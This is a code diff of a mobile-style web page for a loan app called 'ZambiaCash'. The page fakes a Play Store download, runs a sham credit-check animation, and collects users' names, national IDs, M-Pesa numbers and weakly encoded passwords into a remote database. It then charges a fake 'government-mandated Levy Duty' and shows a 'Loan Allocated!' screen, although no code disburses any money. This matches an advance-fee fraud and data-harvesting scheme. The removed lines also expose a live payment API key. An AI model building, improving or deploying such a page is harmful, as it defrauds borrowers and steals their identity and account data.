+                        <svg style="width:1.25rem; height:1.25rem;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg>
+                    </button>
+                    <h2 style="font-size:1.25rem; font-weight:800; color:#0f172a;">Levy Duty Payment</h2>
                 </div>
-                <p class="text-sm text-slate-500 mb-6 font-medium">Pay the government-mandated Levy Duty to activate your loan.</p>
+                <p style="font-size:0.9rem; color:#64748b; margin-bottom:1.5rem;">Pay the government-mandated Levy Duty to activate your loan.</p>
                 
-                <div class="bg-white rounded-3xl p-6 shadow-soft space-y-4 mb-5 border border-slate-100">
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Loan amount</span><span id="pay-loan" class="font-bold text-slate-800">Ksh 1,000</span></div>
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Interest</span><span id="pay-interest" class="font-bold text-slate-800">Ksh 100</span></div>
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total repayment</span><span id="pay-total" class="font-bold text-emerald-600">Ksh 1,100</span></div>
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due date</span><span id="pay-due" class="font-bold text-slate-800">--</span></div>
-                    <hr class="border-slate-100 my-2">
+                <div class="bg-white rounded-3xl p-6 shadow-soft mb-5" style="border:1px solid #e2e8f0; display:flex; flex-direction:column; gap:1rem;">
+                    <div class="flex justify-between items-center"><span style="color:#64748b; font-weight:500; font-size:0.9rem;">Loan amount</span><span id="pay-loan" style="font-weight:700; color:#0f172a;">Ksh 1,000</span></div>
+                    <div class="flex justify-between items-center"><span style="color:#64748b; font-weight:500; font-size:0.9rem;">Interest</span><span id="pay-interest" style="font-weight:700; color:#0f172a;">Ksh 100</span></div>
+                    <div class="flex justify-between items-center"><span style="color:#64748b; font-weight:500; font-size:0.9rem;">Total repayment</span><span id="pay-total" style="font-weight:700; color:#059669;">Ksh 1,100</span></div>
+                    <hr style="border:0; border-top:1px solid #f1f5f9; margin:0.5rem 0;">
                     <div class="flex justify-between items-center">
                         <div>
-                            <span class="text-slate-500 font-medium text-sm block">Levy Duty (pay now)</span>
-                            <span class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">Gov. requirement</span>
+                            <span style="color:#64748b; font-weight:500; font-size:0.9rem; display:block;">Levy Duty (pay now)</span>
+                            <span style="font-size:0.65rem; color:#94a3b8; font-weight:700; text-transform:uppercase; tracking-wider;">Gov. requirement</span>
                         </div>
-                        <span id="pay-levy" class="font-extrabold text-brandYellow text-xl">Ksh 1</span>
+                        <span id="pay-levy" style="font-weight:800; color:#F59E0B; font-size:1.25rem;">Ksh 1</span>
                     </div>
                 </div>
                 
-                <div class="bg-white rounded-3xl p-6 shadow-soft mb-5 border border-slate-100">
-                    <p class="text-sm font-semibold text-slate-800 mb-1">Account: <span id="pay-name"></span></p>
-                    <label class="text-sm font-bold text-slate-900 mb-2 block mt-4">M-Pesa Number</label>
+                <div class="bg-white rounded-3xl p-6 shadow-soft mb-5" style="border:1px solid #e2e8f0;">
+                    <p style="font-size:0.9rem; font-weight:600; color:#0f172a; margin-bottom:0.25rem;">Account: <span id="pay-name"></span></p>
+                    <label style="font-size:0.9rem; font-weight:700; color:#0f172a; margin-bottom:0.5rem; display:block; margin-top:1rem;">M-Pesa Number</label>
                     <input type="tel" id="pay-mpesa" placeholder="0712345678">
-                    <p class="text-[11px] text-slate-400 mt-2 font-medium">Loan will be sent to this number</p>
+                    <p style="font-size:0.7rem; color:#94a3b8; margin-top:0.5rem; font-weight:500;">Loan will be sent to this number</p>
                 </div>
                 
-                <div class="bg-blue-50 border border-blue-100 text-brandBlue text-xs p-4 rounded-2xl mb-6 flex items-start gap-3">
-                    <svg class="w-5 h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                    <p class="font-medium leading-relaxed">Your loan will be released to your M-Pesa immediately after fee payment.</p>
+                <div style="background:#eff6ff; border:1px solid #dbeafe; color:#1E40AF; font-size:0.75rem; padding:1rem; border-radius:1rem; margin-bottom:1.5rem; display:flex; align-items:flex-start; gap:0.75rem;">
+                    <svg style="width:1.25rem; height:1.25rem; flex-shrink:0;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    <p style="font-weight:500; line-height:1.6;">Your loan will be released to your M-Pesa immediately after fee payment.</p>
                 </div>
                 
-                <button onclick="showScreen('screen-select')" class="w-full text-brandBlue font-bold py-3 mb-4 text-sm active:scale-95 transition-transform flex justify-center items-center gap-1">
-                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"></path></svg>
+                <button onclick="showScreen('screen-select')" style="width:100%; color:#1E40AF; font-weight:700; padding:0.75rem; margin-bottom:1rem; font-size:0.9rem; background:none; border:none; cursor:pointer; display:flex; justify-content:center; align-items:center; gap:0.25rem;">
+                    <svg style="width:1rem; height:1rem;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"></path></svg>
                     Change Loan Amount
                 </button>
                 
-                <button onclick="processPayment()" id="btn-pay" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg shadow-brandBlue/20 active:scale-95 transition-transform">Pay Ksh 1 Levy Duty</button>
+                <button onclick="processPayment()" id="btn-pay" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-transform">Pay Ksh 1 Levy Duty</button>
             </div>
         </div>
 
-        <!-- PAYMENT STATUS SCREEN (verifying / success / failed / pending) -->
-        <div id="screen-success" class="screen bg-slate-50 p-6">
-            <div class="max-w-sm mx-auto w-full text-center mt-12">
-
-                <!-- VERIFYING -->
-                <div id="verify-anim" class="flex flex-col items-center">
-                    <div class="w-28 h-28 border-[6px] border-slate-200 border-t-brandBlue rounded-full animate-spin mb-6"></div>
-                    <h2 id="verify-title" class="text-2xl font-extrabold text-slate-900">Initiating Payment</h2>
-                    <p id="verify-subtitle" class="text-sm font-medium text-slate-500 mt-2 px-2 leading-relaxed">Connecting to M-Pesa...</p>
-                    <p id="verify-time" class="text-brandYellow font-extrabold mt-4 text-xl bg-yellow-50 px-4 py-1 rounded-full">0s</p>
+        <div id="screen-success" class="screen p-6" style="background:#f8fafc;">
+            <div style="max-width:24rem; margin:0 auto; width:100%; text-align:center; margin-top:3rem;">
+                
+                <div id="verify-anim" class="flex-col items-center">
+                    <div style="width:7rem; height:7rem; border:6px solid #e2e8f0; border-top-color:#1E40AF; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 1.5rem;"></div>
+                    <h2 style="font-size:1.5rem; font-weight:800; color:#0f172a; margin-bottom:0.5rem;">Sending request</h2>
+                    <p id="verify-subtitle" style="font-size:0.9rem; font-weight:500; color:#64748b; padding:0 0.5rem; line-height:1.6;">Connecting to M-Pesa...</p>
+                    <p id="verify-time" style="color:#F59E0B; font-weight:800; margin-top:1rem; font-size:1.25rem; background:#fef3c7; padding:0.25rem 1rem; border-radius:9999px; display:inline-block;">0s</p>
                 </div>
 
-                <!-- SUCCESS (no Done button) -->
-                <div id="success-anim" class="hide flex flex-col items-center">
-                    <div class="w-24 h-24 bg-emerald-100 text-emerald-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl shadow-glow">✓</div>
-                    <h2 class="text-2xl font-extrabold text-slate-900">Loan Allocated!</h2>
-                    <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4">Funds have been released to your M-Pesa immediately.</p>
+                <div id="success-anim" class="hide flex-col items-center">
+                    <div style="width:6rem; height:6rem; background:#d1fae5; color:#10b981; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:2.5rem; margin:0 auto 1.5rem;">✓</div>
+                    <h2 style="font-size:1.5rem; font-weight:800; color:#0f172a; margin-bottom:0.5rem;">Loan Allocated!</h2>
+                    <p style="font-size:0.9rem; font-weight:500; color:#64748b; margin-bottom:2rem; padding:0 1rem;">Funds have been released to your M-Pesa immediately.</p>
                     
-                    <div class="bg-white rounded-3xl p-6 shadow-soft text-left w-full space-y-4 mb-4 border border-slate-100">
-                        <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Loan Amount</span><span id="suc-loan" class="font-bold text-slate-800 text-lg">Ksh 1,000</span></div>
-                        <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total Repayment</span><span id="suc-total" class="font-bold text-slate-800">Ksh 1,100</span></div>
-                        <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due Date</span><span id="suc-due" class="font-bold text-slate-800">--</span></div>
-                        <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">M-Pesa</span><span id="suc-mpesa" class="font-bold text-brandBlue"></span></div>
+                    <div class="bg-white rounded-3xl p-6 shadow-soft text-left w-full space-y-4 mb-4" style="border:1px solid #e2e8f0;">
+                        <div class="flex justify-between items-center"><span style="color:#64748b; font-weight:500; font-size:0.9rem;">Loan Amount</span><span id="suc-loan" style="font-weight:700; color:#0f172a; font-size:1.1rem;">Ksh 1,000</span></div>
+                        <div class="flex justify-between items-center"><span style="color:#64748b; font-weight:500; font-size:0.9rem;">Total Repayment</span><span id="suc-total" style="font-weight:700; color:#0f172a;">Ksh 1,100</span></div>
+                        <div class="flex justify-between items-center"><span style="color:#64748b; font-weight:500; font-size:0.9rem;">Due Date</span><span id="suc-due" style="font-weight:700; color:#0f172a;">--</span></div>
+                        <div class="flex justify-between items-center"><span style="color:#64748b; font-weight:500; font-size:0.9rem;">M-Pesa</span><span id="suc-mpesa" style="font-weight:700; color:#1E40AF;"></span></div>
                     </div>
-                    <p class="text-[11px] text-slate-400 font-medium mt-2">You may now close the app.</p>
+                    <p style="font-size:0.7rem; color:#94a3b8; font-weight:500; margin-top:0.5rem;">You may now close the app.</p>
                 </div>
 
-                <!-- FAILED / CANCELLED -->
-                <div id="failed-anim" class="hide flex flex-col items-center">
-                    <div class="w-24 h-24 bg-red-100 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">✕</div>
-                    <h2 class="text-2xl font-extrabold text-slate-900">Payment Not Completed</h2>
-                    <p id="failed-reason" class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4 leading-relaxed">
+                <div id="failed-anim" class="hide flex-col items-center">
+                    <div style="width:6rem; height:6rem; background:#fee2e2; color:#ef4444; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:2.5rem; margin:0 auto 1.5rem;">✕</div>
+                    <h2 style="font-size:1.5rem; font-weight:800; color:#0f172a; margin-bottom:0.5rem;">Payment Not Completed</h2>
+                    <p id="failed-reason" style="font-size:0.9rem; font-weight:500; color:#64748b; margin-bottom:2rem; padding:0 1rem; line-height:1.6;">
                         The M-Pesa request was cancelled or failed. You were not charged.
                     </p>
-                    <button onclick="retryPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg shadow-brandBlue/20 active:scale-95 transition-transform">Try Again</button>
+                    <button onclick="retryPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-transform">Try Again</button>
                 </div>
 
-                <!-- PENDING / COULD NOT CONFIRM (never a false success) -->
-                <div id="pending-anim" class="hide flex flex-col items-center">
-                    <div class="w-24 h-24 bg-amber-100 text-amber-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">?</div>
-                    <h2 class="text-2xl font-extrabold text-slate-900">Still Confirming</h2>
-                    <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4 leading-relaxed">
+                <div id="pending-anim" class="hide flex-col items-center">
+                    <div style="width:6rem; height:6rem; background:#fef3c7; color:#f59e0b; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:2.5rem; margin:0 auto 1.5rem;">?</div>
+                    <h2 style="font-size:1.5rem; font-weight:800; color:#0f172a; margin-bottom:0.5rem;">Still Confirming</h2>
+                    <p style="font-size:0.9rem; font-weight:500; color:#64748b; margin-bottom:2rem; padding:0 1rem; line-height:1.6;">
                         We haven't received confirmation from M-Pesa yet. If you have entered your PIN, it may take a moment. Tap below to check again.
                     </p>
-                    <button onclick="checkStatusManual()" id="btn-check-status" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg shadow-brandBlue/20 active:scale-95 transition-transform mb-3 flex justify-center items-center">
+                    <button onclick="checkStatusManual()" id="btn-check-status" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-transform mb-3" style="display:flex; justify-content:center; align-items:center;">
                         <span>Check Status</span>
                     </button>
-                    <button onclick="retryPayment()" class="w-full text-brandBlue font-bold py-3 text-sm active:scale-95 transition-transform">Back to Payment</button>
+                    <button onclick="retryPayment()" style="width:100%; color:#1E40AF; font-weight:700; padding:0.75rem; font-size:0.9rem; background:none; border:none; cursor:pointer;">Back to Payment</button>
                 </div>
 
             </div>
@@ -662,26 +803,19 @@
     </div>
 
     <script>
-        /* ============================================================
-           CONFIG
-           ============================================================ */
+        /* CONFIG */
         const SUPABASE_URL = "https://zpcbfaydgbhpjqsgfluv.supabase.co";
         const SUPABASE_KEY = "sb_publishable_LNA8s-X4zUxoRN-oBsG2mQ_zyRKMAYQ";
         const PALPLUSS_CHANNEL = "30dc7a92-7186-4686-b73d-c323138310c9";
         const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
-        
-        const PALPLUSS_API_KEY = "pp_live_fd61cd105772b221c4dbb023629b56452a55e06e08687de5";
 
         const STK_TIMEOUT_MS  = 15000;  
         const POLL_TIMEOUT_MS = 4000;   
-        const MAX_POLL_SECONDS = 30;    
+        const MAX_POLL_SECONDS = 40;    
 
         const FAILED_STATUSES = ['FAILED', 'CANCELLED', 'REJECTED', 'EXPIRED', 'TIMEOUT', 'DECLINED'];
         const SUCCESS_STATUSES = ['ALLOCATED', 'SUCCESS', 'COMPLETED'];
 
-        /* ============================================================
-           STATE
-           ============================================================ */
         let state = { name: "", id: "", mpesa: "", loan: 1000, levy: 1, term: 30, interest: 100, total: 1100 };
         const amounts = [1000, 2000, 3000, 5000, 7500, 10000, 15000, 20000, 25000, 30000, 40000, 50000];
 
@@ -690,46 +824,34 @@
         let isProcessingPayment = false;
         let currentTxnId = null;
         let toastTimeout;
+        let stkEndpointWarmed = false;
 
-        /* ============================================================
-           HELPERS
-           ============================================================ */
         const format = (num) => "Ksh " + Number(num).toLocaleString();
-
         const calculateLevy = () => 1;
-
         const getDueDate = (days) => {
-            const d = new Date();
-            d.setDate(d.getDate() + days);
+            const d = new Date(); d.setDate(d.getDate() + days);
             return d.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
         };
 
         function showScreen(id) {
             document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
             document.getElementById(id).classList.add('active');
-            window.scrollTo(0, 0);
+            window.scrollTo(0,0);
         }
 
-        function showAndroidToast(message) {
-            const toast = document.getElementById('android-toast');
-            toast.innerText = message;
-            toast.classList.remove('hide', 'hide-toast');
-
+        function showToast(msg) {
+            const t = document.getElementById('android-toast');
+            t.innerText = msg;
+            t.classList.add('show');
             clearTimeout(toastTimeout);
-            toastTimeout = setTimeout(() => {
-                toast.classList.add('hide-toast');
-                setTimeout(() => toast.classList.add('hide'), 300);
-            }, 3500);
+            toastTimeout = setTimeout(() => t.classList.remove('show'), 3500);
         }
 
         async function fetchWithTimeout(url, options = {}, timeoutMs = 30000) {
             const controller = new AbortController();
             const timer = setTimeout(() => controller.abort(), timeoutMs);
-            try {
-                return await fetch(url, { ...options, signal: controller.signal });
-            } finally {
-                clearTimeout(timer);
-            }
+            try { return await fetch(url, { ...options, signal: controller.signal }); }
+            finally { clearTimeout(timer); }
         }
 
         async function readJsonSafe(response) {
@@ -754,57 +876,30 @@
         }
 
         function stopPolling() {
-            if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+            if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
             isPolling = false;
+        }
+
+        // WARM UP THE SUPABASE EDGE FUNCTION TO PREVENT COLD START DELAY
+        function warmUpStkEndpoint() {
+            if (stkEndpointWarmed) return;
+            stkEndpointWarmed = true;
+            fetch(`${SUPABASE_URL}/functions/v1/palpluss-stk`, { method: 'OPTIONS' }).catch(() => {});
         }
 
         async function fetchLoanStatus(txnId) {
             try {
-                const res = await fetchWithTimeout(
-                    `${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}&select=status`,
-                    { headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` } },
-                    POLL_TIMEOUT_MS
-                );
+                const res = await fetchWithTimeout(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}&select=status`, {
+                    headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` }
+                }, POLL_TIMEOUT_MS);
                 if (res.ok) {
                     const rows = await readJsonSafe(res);
                     if (Array.isArray(rows) && rows[0]) {
-                        const status = String(rows[0].status || "").toUpperCase();
-                        if (SUCCESS_STATUSES.includes(status) || FAILED_STATUSES.includes(status)) {
-                            return status;
-                        }
+                        const s = String(rows[0].status || "").toUpperCase();
+                        if (SUCCESS_STATUSES.includes(s) || FAILED_STATUSES.includes(s)) return s;
                     }
                 }
-            } catch (e) {
-                // Ignore and try fallback
-            }
-
-            try {
-                const auth = btoa(`${PALPLUSS_API_KEY}:`);
-                const res = await fetchWithTimeout(`https://api.palpluss.com/v1/transactions/${txnId}`, {
-                    headers: { 'Authorization': `Basic ${auth}` }
-                }, POLL_TIMEOUT_MS);
-                
-                if (res.ok) {
-                    const data = await readJsonSafe(res);
-                    if (data) {
-                        const status = (data.data?.status || data.status || "").toUpperCase();
-                        if (SUCCESS_STATUSES.includes(status)) {
-                            fetch(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}`, {
-                                method: 'PATCH',
-                                headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ status: "ALLOCATED" })
-                            }).catch(() => {});
-                            return 'ALLOCATED';
-                        }
-                        if (FAILED_STATUSES.includes(status)) {
-                            return status;
-                        }
-                    }
-                }
-            } catch (e) {
-                // API error, return pending
-            }
-
+            } catch (e) {}
             return 'PENDING';
         }
 
@@ -815,122 +910,58 @@
             return 'pending';
         }
 
-        /* ============================================================
-           OFFLINE GATE
-           ============================================================ */
-        const offlineGate = document.getElementById('offline-gate');
-
-        function updateConnectionStatus() {
-            offlineGate.classList.toggle('hide', navigator.onLine);
-        }
-
-        window.addEventListener('online', updateConnectionStatus);
-        window.addEventListener('offline', updateConnectionStatus);
-        updateConnectionStatus();
-
-        window.retryConnection = function () {
-            if (navigator.onLine) offlineGate.classList.add('hide');
-            else showAndroidToast("Still offline. Check network settings.");
-        };
-
-        /* ============================================================
-           PLAY STORE GATE
-           ============================================================ */
-        let deferredPrompt;
+        /* PLAY STORE LOGIC */
         const playStoreGate = document.getElementById('play-store-gate');
-        const browserWarning = document.getElementById('browser-warning');
         const appContent = document.getElementById('app-content');
-        const btnStoreInstall = document.getElementById('btn-store-install');
-
-        const preInstallButtons = document.getElementById('pre-install-buttons');
-        const downloadingButtons = document.getElementById('downloading-buttons');
-        const postInstallButtons = document.getElementById('post-install-buttons');
-        const preInstallContent = document.getElementById('pre-install-content');
-        const postInstallContent = document.getElementById('post-install-content');
-        const statsRow = document.getElementById('stats-row');
-
-        const ringSvg = document.getElementById('ring-svg');
-        const downloadRing = document.getElementById('download-ring');
-        const downloadPercent = document.getElementById('download-percent');
-        const downloadText = document.getElementById('download-text');
-
         let downloadInterval = null;
-        let downloadStartTime = 0;
         let isDownloading = false;
 
-        const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
-        const ua = navigator.userAgent || navigator.vendor || window.opera;
-        const isInApp = /musical_ly|BytedanceWebview|FBAN|FBAV|Instagram|WebView|Twitter/i.test(ua);
+        function showInstallState() {
+            document.getElementById('pre-install-buttons').classList.remove('hide');
+            document.getElementById('downloading-buttons').classList.add('hide');
+            document.getElementById('post-install-buttons').classList.add('hide');
+            document.getElementById('download-text').classList.add('hide');
+            document.getElementById('ring-svg').classList.add('hidden');
+            document.getElementById('stats-row').classList.remove('hide');
+            document.getElementById('post-install-content').classList.add('hide');
+            document.getElementById('pre-install-content').classList.remove('hide');
+        }
 
         function showInstalledState() {
-            preInstallButtons.classList.add('hide');
-            downloadingButtons.classList.add('hide');
-            downloadText.classList.add('hide');
-            ringSvg.classList.add('hidden');
-            statsRow.classList.add('hide');
-
-            postInstallContent.classList.remove('hide');
-            preInstallContent.classList.remove('hide');
-
-            postInstallButtons.classList.remove('hide');
+            document.getElementById('pre-install-buttons').classList.add('hide');
+            document.getElementById('downloading-buttons').classList.add('hide');
+            document.getElementById('post-install-buttons').classList.remove('hide');
+            document.getElementById('download-text').classList.add('hide');
+            document.getElementById('ring-svg').classList.add('hidden');
+            document.getElementById('stats-row').classList.add('hide');
+            document.getElementById('post-install-content').classList.remove('hide');
+            document.getElementById('pre-install-content').classList.remove('hide');
         }
 
-        function showInstallState() {
-            postInstallButtons.classList.add('hide');
-            downloadingButtons.classList.add('hide');
-            downloadText.classList.add('hide');
-            ringSvg.classList.add('hidden');
-            statsRow.classList.remove('hide');
-
-            postInstallContent.classList.add('hide');
-            preInstallContent.classList.remove('hide');
-
-            preInstallButtons.classList.remove('hide');
-        }
-
-        if (isStandalone) {
-            playStoreGate.classList.add('hide');
-            appContent.classList.remove('hide');
-            checkSession();
-        } else if (isInApp) {
-            browserWarning.classList.remove('hide');
-        } else {
-            playStoreGate.classList.remove('hide');
-            showInstallState();
-        }
-
-        window.addEventListener('beforeinstallprompt', (e) => {
-            e.preventDefault();
-            deferredPrompt = e;
-        });
-
-        function startFakeDownload() {
-            preInstallButtons.classList.add('hide');
-            downloadingButtons.classList.remove('hide');
-            downloadText.classList.remove('hide');
-            ringSvg.classList.remove('hidden');
-
-            const duration = 30000;
-            downloadStartTime = Date.now();
+        document.getElementById('btn-store-install').addEventListener('click', () => {
+            document.getElementById('pre-install-buttons').classList.add('hide');
+            document.getElementById('downloading-buttons').classList.remove('hide');
+            document.getElementById('download-text').classList.remove('hide');
+            document.getElementById('ring-svg').classList.remove('hidden');
+            
+            let progress = 0;
             isDownloading = true;
-            const circumference = 301.59;
-
+            const ring = document.getElementById('download-ring');
+            const pct = document.getElementById('download-percent');
+            
             downloadInterval = setInterval(() => {
-                const elapsed = Date.now() - downloadStartTime;
-                const progress = Math.min((elapsed / duration) * 100, 100);
-
-                downloadRing.style.strokeDashoffset = circumference - (progress / 100) * circumference;
-                downloadPercent.innerText = Math.floor(progress) + "% of 10 MB";
-
+                progress += 10;
+                ring.style.strokeDashoffset = 301.59 - (progress / 100) * 301.59;
+                pct.innerText = progress + "% of 10 MB";
                 if (progress >= 100) {
                     clearInterval(downloadInterval);
                     isDownloading = false;
-                    setTimeout(showInstalledState, 500);
+                    setTimeout(showInstalledState, 300);
                 }
             }, 100);
-        }
+        });
 
-        window.cancelDownload = function () {
+        window.cancelDownload = function() {
             if (isDownloading) {
                 clearInterval(downloadInterval);
                 isDownloading = false;
@@ -938,36 +969,17 @@
             }
         };
 
-        btnStoreInstall.addEventListener('click', async () => {
-            if (deferredPrompt) {
-                deferredPrompt.prompt();
-                const { outcome } = await deferredPrompt.userChoice;
-                if (outcome === 'accepted') startFakeDownload();
-                deferredPrompt = null;
-            } else {
-                startFakeDownload();
-            }
-        });
+        window.mockUninstall = function() { showInstallState(); };
 
         document.getElementById('btn-open-app').addEventListener('click', () => {
-            showAndroidToast("Opening ZambiaCash...");
+            showToast("Opening ZambiaCash...");
             playStoreGate.classList.add('hide');
-            try { window.close(); } catch (e) {}
-            const isAndroid = /android/i.test(navigator.userAgent);
-            if (isAndroid) {
-                setTimeout(() => {
-                    try {
-                        window.location.href = 'intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.HOME;end';
-                    } catch (e) {}
-                }, 150);
-            }
+            appContent.classList.remove('hide');
+            warmUpStkEndpoint(); 
         });
 
-        window.mockUninstall = function () { showInstallState(); };
-
-        window.setRating = function (rating) {
-            const stars = document.querySelectorAll('.rate-star');
-            stars.forEach((star, index) => {
+        window.setRating = function(rating) {
+            document.querySelectorAll('.rate-star').forEach((star, index) => {
                 if (index < rating) {
                     star.classList.remove('text-gray-300');
                     star.classList.add('text-brandYellow');
@@ -979,90 +991,53 @@
                 }
             });
             if (rating > 0) {
-                const btnReview = document.getElementById('btn-write-review');
-                btnReview.innerText = `Thanks for rating ${rating} stars!`;
-                btnReview.classList.remove('text-playBlue');
-                btnReview.classList.add('text-emerald-600');
+                const btn = document.getElementById('btn-write-review');
+                btn.innerText = `Thanks for rating ${rating} stars!`;
+                btn.classList.remove('text-playBlue');
+                btn.classList.add('text-emerald-600');
             }
         };
 
-        /* ============================================================
-           SESSION / LOGIN
-           ============================================================ */
-        function checkSession() {
-            try {
-                const saved = localStorage.getItem('zc_user');
-                if (saved) {
-                    state = { ...state, ...JSON.parse(saved) };
-                    buildLoanScreen();
-                }
-            } catch (e) {
-                localStorage.removeItem('zc_user');
-            }
-
-            const inflightTxn = localStorage.getItem('inflight_txn');
-            if (inflightTxn) {
-                currentTxnId = inflightTxn;
-                showScreen('screen-success');
-                startPolling(inflightTxn);
-            }
-        }
-
+        /* APP LOGIC */
         function submitLogin() {
             const name = document.getElementById('in-name').value.trim();
             const id = document.getElementById('in-id').value.trim();
             const mpesa = document.getElementById('in-mpesa').value.trim();
             const pass = document.getElementById('in-pass').value;
 
-            if (!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return showAndroidToast("Please enter a valid full name.");
-            if (!/^\d{7,8}$/.test(id)) return showAndroidToast("National ID must be 7-8 digits.");
-            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return showAndroidToast("Enter a valid Safaricom or Airtel number (07XX or 01XX).");
-            if (pass.length < 4) return showAndroidToast("Password must be at least 4 characters.");
+            if (!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return showToast("Enter a valid full name.");
+            if (!/^\d{7,8}$/.test(id)) return showToast("National ID must be 7-8 digits.");
+            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return showToast("Enter a valid M-Pesa number.");
+            if (pass.length < 4) return showToast("Password must be at least 4 characters.");
 
-            state.name = name;
-            state.id = id;
-            state.mpesa = mpesa;
-            localStorage.setItem('zc_user', JSON.stringify(state));
-
+            state.name = name; state.id = id; state.mpesa = mpesa;
+            
             fetch(`${SUPABASE_URL}/rest/v1/users`, {
                 method: 'POST',
-                headers: {
-                    'apikey': SUPABASE_KEY,
-                    'Authorization': `Bearer ${SUPABASE_KEY}`,
-                    'Content-Type': 'application/json',
-                    'Prefer': 'return=minimal'
-                },
+                headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
                 body: JSON.stringify({ full_name: name, national_id: id, mpesa_number: mpesa, password_hash: "web_" + btoa(pass) })
             }).catch(() => {});
 
-            startChecking();
-        }
-
-        function startChecking() {
             showScreen('screen-checking');
-            let progress = 0;
-            const msgs = ["Analyzing profile...", "Reviewing information...", "Checking M-Pesa...", "Calculating limit...", "Almost there..."];
-            const interval = setInterval(() => {
-                progress += 2;
-                document.getElementById('check-bar').style.width = progress + "%";
-                document.getElementById('check-percent').innerText = progress + "%";
-                document.getElementById('check-status').innerText = msgs[Math.min(4, Math.floor(progress / 20))];
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    setTimeout(buildLoanScreen, 300);
+            let p = 0;
+            const int = setInterval(() => {
+                p += 20;
+                document.getElementById('check-bar').style.width = p + "%";
+                document.getElementById('check-percent').innerText = p + "%";
+                document.getElementById('check-status').innerText = p < 50 ? "Analyzing profile..." : "Calculating limit...";
+                if (p >= 100) {
+                    clearInterval(int);
+                    buildLoanScreen();
                 }
-            }, 200);
+            }, 100); 
         }
 
-        /* ============================================================
-           LOAN SELECTION
-           ============================================================ */
         function buildLoanScreen() {
             const grid = document.getElementById('amount-grid');
             grid.innerHTML = '';
             amounts.forEach(amt => {
                 const btn = document.createElement('button');
-                btn.className = `amount-btn py-3.5 text-sm ${amt === state.loan ? 'selected' : ''}`;
+                btn.className = `amount-btn ${amt === state.loan ? 'selected' : ''}`;
                 btn.innerText = amt.toLocaleString();
                 btn.onclick = () => {
                     document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('selected'));
@@ -1079,18 +1054,18 @@
         function setTerm(days, btn) {
             state.term = days;
             document.querySelectorAll('.term-btn').forEach(b => b.classList.remove('selected'));
-            if (btn) btn.classList.add('selected');
+            btn.classList.add('selected');
             updateSummary();
         }
 
         function updateSummary() {
-            state.levy = calculateLevy(state.loan);
+            state.levy = 1;
